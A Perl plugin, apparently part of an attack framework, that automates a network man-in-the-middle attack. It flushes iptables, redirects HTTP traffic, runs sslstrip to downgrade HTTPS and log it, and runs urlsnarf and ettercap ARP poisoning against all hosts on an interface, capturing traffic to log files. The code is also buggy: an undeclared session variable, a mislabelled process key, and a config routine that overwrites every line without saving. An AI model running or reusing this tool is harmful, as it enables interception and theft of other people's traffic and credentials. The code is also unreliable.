package Plugin::Ettercap;

#require Nemesis::Process;
use warnings;
my @PUBLIC_FUNCTIONS = qw(configure check_installation start);

sub new {

 #Usually the new() and export_public_methods can be copyed from other plugins

    my $package = shift;
    bless( {}, $package );
    my (%Obj) = @_;
    %{ $package->{'core'} } = %Obj;

    #Here goes the required parameters to be passed

    die("IO and environment must be defined\n")
        if ( !defined( $package->{'core'}->{'IO'} )
        || !defined( $package->{'core'}->{'env'} ) );
    return $package;
}

sub export_public_methods() {
    my $self = shift;
    return @PUBLIC_FUNCTIONS;

}

sub info() {

}
sub clear(){
	return 1;}
##TO DO ONE START FOR ONE INTERFACE, MORE ETTERCAP OBJECTS , ONE FOR EACH INTERFACE.
sub start {
    my $self       = shift;
    my $target_dev = $_[0];
    my $session_id = int( rand(99999) );
    my $IO         = $self->{'CONFIG'}->{'IO'};
    my $interfaces = $self->{'CONFIG'}->{'interfaces'};
    my $env        = $self->{'CONFIG'}->{'env'};
    bless( {}, $session );
    $IO->debug("Started Ettercap on $target_dev");
    $IO->print_info("Flushing iptables..");
    $IO->exec("iptables --flush");
    $IO->exec("iptables --table nat --flush");
    $IO->exec("iptables --delete-chain");
    $IO->exec("iptables --table nat --delete-chain");
    $IO->exec("iptables --flush");
    $IO->exec("iptables --flush");
    $IO->print_info("Configurating iptables..");
    $IO->exec(
        "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
    );

    my $cwd = $env->workspace() . "/" . $env->time() . "-id" . $session_id;
    if ( !-d $cwd ) {
        mkdir($cwd);
    }
    $IO->print_info( "LOG Directory: " . $cwd );

    $IO->print_info("Launching SSLStrip..");
    my $tr_sslstrip = new Nemesis::Process(
        IO      => $IO,
        env     => $env,
        command => "sslstrip -f -p -k -w " . $cwd . "/sslstrip.log",
        cwd     => $cwd,
        monitor => 1,
        resume  => 0
    );
    $tr_sslstrip->start();
    $session->{'sslstrip'} = $tr_sslstrip;
    $IO->print_info(
        "Checking devices where urlsnarf and ettercap are going to be launched"
    );

    $IO->print_info( "Launching URLsnarf on " . $target_dev );
    my $tr_urlsnarf = new Nemesis::Process(
        IO      => $IO,
        env     => $env,
        command => "urlsnarf -i "
            . $target_dev . " > "
            . $cwd
            . "/urlsnarf.log",
        cwd     => $cwd,
        monitor => 1,
        resume  => 0
    );
    $tr_urlsnarf->start();
    $session->{'urlsnarf'} = $tr_urlsnarf;
    $IO->print_info( "Launching Ettercap on " . $target_dev );
    my $tr_ettercap = new Nemesis::Process(
        IO      => $IO,
        env     => $env,
        command => "ettercap -T -i "
            . $target_dev . " -w "
            . $cwd
            . "/ettercap.pcap -L "
            . $cwd
            . " -M arp // // -p autoadd",
        cwd     => $cwd,
        monitor => 1,
        resume  => 0
    );
    $tr_ettercap->start();
    $session->{'urlsnarf'} = $tr_ettercap;

    bless( {}, $self->{'sessions'}->{$session_id} );
    $self->{'sessions'}->{$session_id} = $session;
    $tr_ettercap->status();
    $tr_urlsnarf->status();

}

sub configure {

    my $self = shift;

    open ETTERCONF, "</etc/etter.conf";
    my @etter = <ETTERCONF>;
    close ETTERCONF;
    chomp(@etter);
    foreach my $rigo (@etter) {
        if ( $rigo !~ /.*ec_uid.*\=.*0/ ) {
            $rigo = 'ec_uid=0';
        }
        if ( $rigo !~ /.*ec_gid.*\=.*0/ ) {
            $rigo = 'ec_gid=0';
        }

        if ( $rigo !~ /.*ec_gid.*\=.*0/ ) {
            $rigo = 'ec_gid=0';
        }

        #iptables

    }

}

1;
__END__
